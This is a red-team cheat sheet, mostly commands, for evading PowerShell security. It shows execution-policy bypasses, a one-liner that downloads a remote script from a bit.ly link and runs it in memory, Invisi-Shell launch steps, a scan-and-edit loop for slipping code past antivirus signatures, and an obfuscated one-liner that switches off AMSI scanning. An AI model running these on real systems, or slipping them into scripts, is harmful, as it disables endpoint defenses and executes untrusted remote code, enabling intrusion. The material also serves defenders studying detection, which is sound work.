
### Powershell Detections

1. System-wide Transcription
2. Script Block Logging
3. AntiMalware Scan Interface
4. Constrained language Mode-  integrated with applocker and WDAC



### Ways to bypass   Execution Policy

 View the Execution Policy

~~~
Get-ExecutionPolicy
~~~

To view a list of them use the command

~~~
Get-ExecutionPolicy -List | Format-Table -AutoSize
~~~

Simply ECHO your script into PowerShell standard input. This technique does not result in a configuration change or require writing to disk.

~~~
Echo Write-Host "My voice is my passport, verify me." | PowerShell.exe -noprofile -
~~~

This technique can be used to download a PowerShell script from the internet and execute it without having to write to disk. It also doesn’t result in any configuration changes.

~~~
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://bit.ly/1kEgbuH')"
~~~

Use the “Bypass” Execution Policy Flag

~~~
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
~~~

This similar to the “Bypass” flag. However, when this flag is used Microsoft states that it “Loads all configuration files and runs all scripts. If you run an unsigned script that was downloaded from the Internet, you are prompted for permission before it runs.”

~~~
PowerShell.exe -ExecutionPolicy UnRestricted -File .runme.ps1
~~~

~~~
powershell -ExecutionPolicy bypass
~~~

~~~
$env:PSExecutionPolicyPrefrence="bypass"
~~~

`https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy/`

## Bypassing Powershell Security

Using Invisi-Shell

with admin privileges:

~~~
RunWithPathAsAdmin.bat
~~~

with non-admin privileges:

~~~
RunWithPathNonAdmin.bat
~~~


## AMSI  

The Antimalware Scan Interface (AMSI) allows third-party applications with AMSI support to send objects (for example, PowerShell scripts) to Kaspersky Endpoint Security for an additional scan and then receive the results from scanning these objects.


## Bypassing AV signature for Powershell

AMSI:

`https://github.com/RythmStick/AMSITrigger`

Steps:

1. Scan using AMSITrigger
2. Modify the detected code snippet 
3. Rescan using AMSItrigger
4. Repeat the steps 2 & 3 till we get a result as "AMSI_RESULT_NOT_DETECTED" or "Blank"


## AMSI Bypass

~~~
powershell -ep bypass
~~~

~~~
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) (
[TYpE]( "{1}{0}"-F'F','rE' ) ) ;
(
Get-varI`A`BLE (
('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"((
"{6}{3}{1}{4}{2}{0}{5}" - f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'m
ation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -
f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f
('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(
${n`ULl},${t`RuE} )
~~~~


